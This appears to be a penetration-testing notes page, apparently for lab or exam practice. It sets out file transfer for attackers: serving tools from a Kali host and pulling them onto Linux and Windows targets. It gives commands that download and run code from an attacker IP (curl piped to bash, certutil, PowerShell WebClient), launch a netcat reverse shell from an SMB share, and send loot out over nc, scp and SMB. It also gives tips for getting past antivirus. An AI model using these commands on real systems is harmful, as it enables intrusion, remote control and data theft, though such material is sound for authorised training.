# 🐚 File Transfer

> Getting tools **onto** a target (linpeas/winPEAS/nc/exploits) and loot **off** it. HTTP works almost everywhere; SMB is cleanest for Windows. Match the method to what the target has and can reach.

Part of [[Shells]]. Related: [[Reverse & Bind Shells]] · [[File Transfer Cheat Sheet]] · [[Linux Privilege Escalation]] · [[Windows Privilege Escalation]]

---

## 🧠 THINK
- **Serve from Kali**, pull from the target — the target can usually reach you (tun0), not vice-versa.
- HTTP (`python3 -m http.server`) is the universal default; SMB for Windows; `nc`/`scp` for exfil.
- Use writable dirs: Linux `/tmp`, `/dev/shm`; Windows `C:\Windows\Temp`.

## 📤 SERVE FROM KALI
```bash
python3 -m http.server 80
```
```bash
impacket-smbserver share . -smb2support        # SMB share for Windows pulls
```

## 📥 DOWNLOAD — Linux target
```bash
wget http://10.10.14.5/linpeas.sh -O /tmp/lp.sh
```
```bash
curl http://10.10.14.5/linpeas.sh -o /tmp/lp.sh
```
```bash
curl http://10.10.14.5/s.sh | bash        # run without saving
```

## 📥 DOWNLOAD — Windows target
```cmd
certutil -urlcache -f http://10.10.14.5/winPEAS.exe winPEAS.exe
```
```powershell
iwr http://10.10.14.5/winPEAS.exe -OutFile C:\Windows\Temp\wp.exe
```
```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','C:\Windows\Temp\nc.exe')
```
SMB pull (no disk write needed to run):
```cmd
copy \\10.10.14.5\share\winPEAS.exe . & \\10.10.14.5\share\nc.exe 10.10.14.5 443 -e cmd
```

## 📤 EXFIL — loot back to Kali
```bash
nc -lvnp 443 > loot.zip           # Kali ; victim: nc 10.10.14.5 443 < loot.zip
```
```bash
scp user@$IP:/path/loot .          # if you have SSH creds
```
Via writable SMB share: `copy loot.zip \\10.10.14.5\share\`.

## 🔁 FOUND → NEXT
| SITUATION | METHOD |
|---|---|
| Linux target, HTTP out | `wget`/`curl` from `python3 -m http.server` |
| Windows target | `certutil`/`iwr`, or SMB share |
| No disk write (Win) | run straight off `\\IP\share\` or `iex(iwr...)` |
| evil-winrm session | built-in `upload`/`download` |
| Exfil loot | `nc`/`scp`/SMB share |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Target can't reach Kali | check tun0 IP/firewall; serve on 80/443; try SMB |
| `certutil` blocked | `iwr`/`WebClient`; SMB; bitsadmin |
| AV deletes the tool | run from memory (`iex(iwr...)`); rename; use LOLBins |
| No HTTP client on Linux | `/dev/tcp` download, `scp`, or SMB (smbclient) |

## 📇 CHEAT SHEET
```bash
python3 -m http.server 80              # Kali serve
```
```bash
wget http://10.10.14.5/lp.sh -O /tmp/lp.sh          # Linux pull
```
```cmd
certutil -urlcache -f http://10.10.14.5/wp.exe wp.exe   :: Windows pull
```
```bash
impacket-smbserver share . -smb2support ; copy \\10.10.14.5\share\x.exe .   # SMB
```
See [[File Transfer Cheat Sheet]] for the condensed version.
**Kill shot:** serve on Kali → pull with wget/certutil/SMB → exfil with `nc`/`scp`.
